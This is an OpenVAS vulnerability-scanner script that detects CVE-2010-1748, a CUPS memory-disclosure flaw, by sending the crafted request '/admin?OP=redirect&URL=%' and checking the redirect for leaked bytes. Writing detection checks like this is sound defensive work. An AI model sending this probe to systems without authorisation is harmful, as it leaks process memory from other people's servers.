###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cups_info_disc_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# CUPS Information Disclosure Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to obtain sensitive
  information from cupsd process memory via a crafted request.
  Impact Level: Application";
tag_affected = "CUPS version 1.4.3 and prior.";
tag_insight = "This flaw is due to an error in 'cgi_initialize_string' function in
  'cgi-bin/var.c' which mishandles input parameters containing the '%'
  character.";
tag_solution = "Upgrade to CUPS version 1.4.4 or later,
  For updates refer to http://www.cups.org/software.php";
tag_summary = "The host is running CUPS and is prone to Information disclosure
  vulnerability.";

if(description)
{
  script_id(801664);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-21 15:42:46 +0100 (Tue, 21 Dec 2010)");
  script_cve_id("CVE-2010-1748");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("CUPS Information Disclosure Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://cups.org/str.php?L3577");
  script_xref(name : "URL" , value : "http://cups.org/articles.php?L596");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/40220");

  script_description(desc);
  script_summary("Check if CUPS is vulnerable to Information Disclosure");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports(631);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get CUPS Port
cupsPort = get_http_port(default:631);
if(!cupsPort){
  cupsPort = 631;
}

## Check Port Status
if(!get_port_state(cupsPort)){
  exit(0);
}

## Confirm Application
banner = get_http_banner(port:cupsPort);
if("Server: CUPS" >< banner)
{
  ## Construct the Attack Request
  req = http_get(item:"/admin?OP=redirect&URL=%", port:cupsPort);
  res = http_keepalive_send_recv(port:cupsPort, data:req);

  ## Confirm exploit worked by checking the response
  if(egrep(pattern:'^Location:.*%FF.*/cups/cgi-bin/admin.cgi', string:res))
  {
    security_warning(cupsPort);
    exit(0);
  }
}
